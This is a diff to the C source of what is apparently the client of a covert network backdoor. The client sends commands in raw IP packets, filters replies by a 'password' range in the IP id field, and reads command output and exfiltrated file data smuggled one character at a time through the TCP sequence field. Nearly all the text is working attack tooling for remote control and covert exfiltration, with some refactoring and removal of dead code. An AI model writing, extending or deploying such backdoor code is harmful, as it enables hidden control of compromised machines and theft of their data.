@@ -9,9 +9,6 @@
 #include "client.h"
 #include "util.h"
 
-char *data;
-int buf_len = 0;
-
 void backdoor_client(uint32 srcip, uint32 destip, char* protocol) {
 	client *cln;
 	char *cmd;
@@ -230,7 +227,7 @@ void send_packets(client *c, char *input, char* protocol) {
 		sin.sin_addr.s_addr = packets_tcp.ip.daddr;
 
 		if ((send_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
-			SystemFatal("send_packets(): socket: unable to create a socket.");
+			error("send_packets(): socket: unable to create a socket.");
 		}
 
 		sendto(send_socket, &packets_tcp, packets_tcp.ip.tot_len, 0,
@@ -246,7 +243,7 @@ void send_packets(client *c, char *input, char* protocol) {
 		sin.sin_addr.s_addr = packets_udp.ip.daddr;
 
 		if ((send_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
-			SystemFatal("send_packets(): socket: unable to create a socket.");
+			error("send_packets(): socket: unable to create a socket.");
 		}
 
 		sendto(send_socket, &packets_udp, packets_udp.ip.tot_len, 0,
@@ -256,11 +253,6 @@ void send_packets(client *c, char *input, char* protocol) {
 		close(send_socket);
 	}
 
-}
-
-void SystemFatal(char *msg) {
-	printf("\n%s\n\n", msg);
-	exit(EXIT_FAILURE);
 }
 
 /*-------- Checksum Algorithm (Public domain Ping) ----------------------*/
@@ -344,40 +336,6 @@ pcap_t * open_pcap_socket(char *device, const char *filter) {
 
 }
 
-void parse_packet(u_char *user, struct pcap_pkthdr *packethdr, u_char *packet) {
-	struct iphdr* iphdr;
-	struct tcphdr* tcphdr;
-	char *tcp_payload;
-	int size_ip, size_tcp;
-
-	iphdr = (struct iphdr*) (packet + sizeof(struct ether_header));
-	tcphdr = (struct tcphdr*) (packet + sizeof(struct ether_header)
-			+ sizeof(struct iphdr));
-
-	size_ip = iphdr->ihl * 4;
-	size_tcp = tcphdr->doff * 4;
-
-	if (size_tcp < 20) {
-		printf("INVALID TCP HEADER SIZE\n");
-		return;
-	}
-
-	if (ntohs(iphdr->id) == 5002) {
-		file = fopen("results.log", "a+");
-		tcp_payload = (char *) (packet + sizeof(struct ether_header) + size_ip
-				+ size_tcp);
-
-		// decrypt payload
-		//tcp_payload = decrypt();
-		fprintf(file, "Command Response: \n\n%s\n", tcp_payload);
-		fprintf(file,
-				"==================================================================\n\n");
-
-		fclose(file);
-		//running = false;
-	}
-}
-
 void parse_response_packet(u_char *user, struct pcap_pkthdr *packethdr,
 		u_char *packet) {
 	struct iphdr* iphdr;
@@ -401,51 +359,13 @@ void parse_response_packet(u_char *user, struct pcap_pkthdr *packethdr,
 
 	if ((password >= 5000) && (password <= 5050)) {
 
-		/*tcp_payload = malloc(sizeof(char *));
-
-		//tcp_payload = (char *)tcphdr->seq;
-		//sscanf(tcp_payload, "%c", tcphdr->seq);
-
-		if (buf_len == 0)
-			data = (char *) malloc(FRAM_SZ);
-
-		ptr = (char *) (tcphdr + 4); */
-
-		//char * payload = tcphdr->seq;
-		printf("%c", tcphdr->seq);
-
-		/*char * character = malloc(sizeof(tcphdr->seq));
-		character = tcphdr->seq;
-		printf("%s \n", character);*/
-
-		//char word = (char)tcphdr->seq;
-		//data += word;
-		//strcat(data, word);
-		//memcpy(data, ptr, 1);
-
-		//fprintf(stdout, "data: %s \n", data);
-
-		/*buf_len += 1;
-
-		if (buf_len % FRAM_SZ == 0) {
-
-			data -= FRAM_SZ - 1;*/
-
-			// decrypt payload
-			//decrypt(SEKRET, data, FRAM_SZ);
-
 			int sourcePort = ntohs(tcphdr->source);
 
-			if (sourcePort == RSP_TYP) {
-				printf("Command Response: \n\n%s\n", data);
-				printf(
-						"==================================================================\n\n");
-			} else if (sourcePort == XFL_TYP) {
-				writeToFile(data);
+			if (sourcePort == RSP_PORT) {
+				printf("%c", tcphdr->seq);
+			} else if (sourcePort == XFL_PORT) {
+				writeToFile(tcphdr->seq);
 			}
 
-			//buf_len = 0;
-			//free(data);
-		//}
 	}
 }
